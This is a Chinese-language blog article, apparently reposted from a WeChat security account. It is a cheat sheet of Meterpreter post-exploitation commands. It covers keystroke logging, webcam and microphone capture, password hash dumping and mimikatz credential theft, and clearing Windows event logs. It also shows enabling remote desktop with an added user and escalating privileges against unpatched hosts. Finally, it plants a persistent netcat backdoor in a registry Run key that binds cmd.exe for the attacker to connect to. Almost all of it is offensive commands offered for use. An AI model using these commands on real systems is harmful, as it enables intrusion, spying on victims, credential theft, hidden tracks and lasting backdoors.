\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/wqhHMCHNrlLg-EhD\_1mt2Q)

**前言**
------

Meterpreter 是 Metasploit 框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。Meterpreter 功能强大，支持信息收集、提权、注册表操作、哈希利用、截屏录屏等操作，也支持对摄像头、录音设备、键盘鼠标的控制。

  

---

**常用命令**
--------

```
sessions -i 进入会话
sessions -k 杀死会话
pwd         查看当前目录
getuid      查看当前用户信息
sysinfo     查看远程主机系统信息
execute     在目标主机上执行命令
hashdump    获取目标主机用户密码hash信息
getsystem   提升权限
shell       切换至传统shell
background  将当前session放入后台
kill        关闭进程
load        加载meterpreter扩展
exit        退出当前shell
arp         显示ARP缓存
getproxy    显示当前代理配置
ifconfig    显示接口
ipconfig    显示接口
netstat     显示网络连接
portfwd     将本地端口转发到远程服务
route       查看和修改路由
getenv      查看环境变量
getprivs    查看权限
pgrep       搜索进程
ps          查看当前运行进程
reboot      重启系统
reg         修改注册表
clearev     清除windows中的应用程序日志、系统日志、安全日志
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic3ibMm7q7SicDzDLPZia7LEUvxf8iaduN8rkWoUQKaT6Vk3W4OrS3AbCQld7ibJwM5Ric5aicw9DfqmacaibA/640?wx_fmt=png)

  

---

**文件系统命令**
----------

```
cat           查看文件
cd            改变目录
checksum      校验文件md5或sha1
cp            拷贝文件
download      下载文件
edit          编辑文件
ls            列出文件
mkdir         创建文件夹
mv            移动文件
rm            删除文件
rmdir         删除文件夹
search        查找文件
show\_mount    列出所有驱动器
upload        上传文件
```

  

---

**用户设备命令**
----------

```
enumdesktops   列出所有可访问的桌面和窗口
getdesktop     获取当前桌面
idletime       获取远程系统已运行时间（从上次重新启动开始计算）
keyboard\_send  发送击键
keyscan\_dump   转储击键缓冲区
keyscan\_start  开始捕获击键
keyscan\_stop   停止捕获击键
mouse          发送鼠标事件
screenshare    实时观看远程用户的桌面
screenshot     截屏
setdesktop     更改shell当前桌面
uictl          控制用户界面组件
record\_mic     记录麦克风一定秒数
webcam\_chat    开始视频聊天
webcam\_list    列出网络摄像头
webcam\_snap    从指定网络摄像头拍摄
webcam\_stream  播放指定网络摄像头的视频流
play           在目标系统播放音频
```

  

---

**mimikatz 抓取密码**
-----------------

```
load mimikatz   加载mimikatz模块
help mimikatz   查看帮助
wdigest         获取密码
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic3ibMm7q7SicDzDLPZia7LEUvxjrDNInZcknnpOHnHsc4Cq0NCiaG0rMRUJF53UCvO1j6SDXZczhkC92A/640?wx_fmt=png)

**开启远程桌面**
----------

```
run vnc 使用vnc连接远程桌面
run getgui -e 开启远程桌面
run post/windows/manage/enable\_rdp 开启远程桌面
run post/windows/manage/enable\_rdp USERNAME=test PASSWORD=123456 添加用户
run post/windows/manage/enable\_rdp FORWARD=true LPORT=6662   将3389端口转发到6662
```

  

---

**收集信息**
--------

```
run post/windows/gather/checkvm #是否虚拟机
run post/linux/gather/checkvm #是否虚拟机
run post/windows/gather/forensics/enum\_drives #查看分区
run post/windows/gather/enum\_applications #获取安装软件信息
run post/windows/gather/dumplinks   #获取最近的文件操作
run post/windows/gather/enum\_ie  #获取IE缓存
run post/windows/gather/enum\_chrome   #获取Chrome缓存
run post/windows/gather/enum\_patches  #补丁信息
run post/windows/gather/enum\_domain  #查找域控
```

  

---

**针对未安装补丁攻击**
-------------

```
run post/windows/gather/enum\_patches  收集补丁信息
攻击：
msf > use exploit/windows/local/xxxx
msf > set SESSION 2
msf > exploit
```

**注册表设置 nc 后门**
---------------

```
upload /usr/share/windows-binaries/nc.exe C:\\\\windows\\\\system32 #上传nc
reg enumkey -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run   #枚举run下的key
reg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v lltest\_nc -d 'C:\\windows\\system32\\nc.exe -Ldp 443 -e cmd.exe' #设置键值
reg queryval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\Run -v lltest\_nc   #查看键值
nc -v 192.168.159.144 443  #攻击者连接nc后门
```

  

---

参考资料
----

*   meterpreter help 文件
    
*   https://xz.aliyun.com/t/2536
    

文章作者: 麻薯  
原始链接: www.uuzdaisuki.com

**关注公众号: HACK 之道**  

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3qL1R1NCVbY1ElanNngBlMTUKUibAUoQNQuufs7QibuMXoBHX5ibneNiasMzdthUAficktvRzexoRTXuw/640?wx_fmt=jpeg)